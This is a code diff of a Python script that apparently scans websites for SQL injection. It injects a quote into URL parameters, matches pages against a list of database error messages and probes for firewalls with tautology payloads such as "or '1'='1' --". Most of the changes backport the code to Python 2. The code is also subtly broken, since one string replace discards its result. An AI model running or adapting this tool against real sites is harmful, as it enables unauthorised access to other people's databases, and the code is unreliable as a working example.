@@ -1,6 +1,7 @@
 from requests import get_the_page
+from response import site_alive
 
-errors = ["You have an error in your SQL syntax", "mysqli_fetch_assoc()", "Execution of a query to the database failed", "Unknown column", "404 Error Message", "mysql_num_rows()",
+errors = ["You have an error in your SQL syntax", "Execution of a query to the database failed", "Unknown column", "404 Error Message", "mysql_num_rows()",
           "mysql_fetch_array()", "Error Occurred While Processing Request", "Server Error in '/' Application",
           "Microsoft OLE DB Provider for ODBC Drivers error", "error in your SQL syntax", "include()",
           "Invalid Querystring", "OLE DB Provider for ODBC", "Error: You have an error in your SQL syntax", "VBScript Runtime", "ADODB.Field", "BOF or EOF",
@@ -20,52 +21,52 @@ def vuln(site):
             the_page = get_the_page(site, "1")
             for index in errors:
                 if index in the_page:
-                    print("The site is SQLi Vulnerable")
+                    print "The site is SQLi Vulnerable"
                     vuln_move = 1
                     break
 
             if not vuln_move:
-                print("Is this the vulnerable parameter %s?(y/n)" % flag)
-                ans = input()
+                print "Is this the vulnerable parameter %s?(y/n)" % flag
+                ans = raw_input()
 
                 while ans != 'y' and ans != 'Y' and ans != 'n' and ans != 'N':
-                    print("WRONG INPUT! \nIs this the vulnerable parameter %s?(y/n)" % flag)
-                    ans = input()
+                    print "WRONG INPUT! \nIs this the vulnerable parameter %s?(y/n)" % flag
+                    ans = raw_input()
 
                 if ans == 'Y' or ans == 'y':
-                    print('This parameter is not vulnerable')
-                    print('Program will exit')
+                    print 'This parameter is not vulnerable'
+                    print 'Program will exit'
                     exit()
 
                 if ans == 'N' or ans == 'n':
-                    print("Give me the vulnerable parameter: ")
-                    parameter = input()
+                    print "Give me the vulnerable parameter: "
+                    parameter = raw_input()
                     site.replace(parameter, parameter + "'")
                     the_page = get_the_page(site, "1")
                     for index in errors:
                         if index in the_page:
-                            print("The site is SQLi Vulnerable")
+                            print "The site is SQLi Vulnerable"
                             vuln_move = 1
                             break
 
                 if not vuln_move:
-                    print('This parameter is not vulnerable')
-                    print('Program will exit')
+                    print 'This parameter is not vulnerable'
+                    print 'Program will exit'
                     exit()
             else:
-                return flag
+                return(flag)
     else:
-        print("Are you sure that you gave the correct url?(y/n)")
-        ans = input()
+        print "Are you sure that you gave the correct url?(y/n)"
+        ans = raw_input()
         while ans != 'y' and ans != 'Y' and ans != 'n' and ans != 'N':
-            print("WRONG INPUT! \nAre you sure that you gave the correct url?(y/n)")
-            ans = input()
+            print "WRONG INPUT! \nAre you sure that you gave the correct url?(y/n)"
+            ans = raw_input()
         if ans == 'y' or ans == 'Y':
-            print("This is not a vulnerable url")
-            print("Program will exit")
+            print "This is not a vulnerable url"
+            print "Program will exit"
             exit()
         else:
-            return "1"
+            return ("1")
 
 
 def f_vuln_col(site, columns):  # <--- Edw kai katw ftia3imo
@@ -91,7 +92,7 @@ def f_vuln_col(site, columns):  # <--- Edw kai katw ftia3imo
             if str(i) in the_page:
                 vuln_column = i
                 break
-    return vuln_column
+    return(vuln_column)
 
 
 def find_vulnerable_param(site):
@@ -99,7 +100,7 @@ def find_vulnerable_param(site):
     i = len(site) - 2
     while i > 0:
         if site[i] == '=':
-            while site[i] != '?':
+            while site[i] <> '?':
                 param = param + site[i]
                 i = i - 1
             i = -1
@@ -109,11 +110,11 @@ def find_vulnerable_param(site):
 
 
 def has_firewall(site):
-    site = site.replace("'", "")
-    site = site + "/**/or/**/'1'='1'--"
+    site = site.replace("'", '')
+    site = site + "or '1'='1' -- "
     the_page = get_the_page(site, "1")
     if ('Not Acceptable!' in the_page) or ('forbiden' in the_page):
-        print("Firewall detected")
-        print("Bypassing firewalls under construction")
+        print "Firewall detected"
+        print "Bypassing firewalls under construction"
     else:
-        print("No Firewall detected!")
+        print "No Firewall detected!"
